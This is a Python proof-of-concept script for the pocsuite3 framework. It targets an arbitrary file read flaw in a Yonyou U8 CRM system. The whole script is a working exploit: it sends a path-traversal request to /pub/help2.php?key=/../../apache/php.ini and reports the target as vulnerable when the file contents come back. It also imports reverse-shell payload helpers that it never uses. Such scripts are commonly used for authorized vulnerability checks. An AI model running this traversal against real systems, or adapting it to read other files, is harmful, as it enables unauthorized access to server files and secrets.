# _*_ coding:utf-8 _*_
# @Time : 2023/12/18
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yongyouu8_CRM_fileread(POCBase):
    pocDesc = '''用友CRM系统某接口存在任意文件读取'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-18'
    name = '用友CRM系统某接口存在任意文件读取'



    def _verify(self):

        result = {}
        url = self.url+ '/pub/help2.php?key=/../../apache/php.ini'

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
        }

        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'About php.ini' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yongyouu8_CRM_fileread)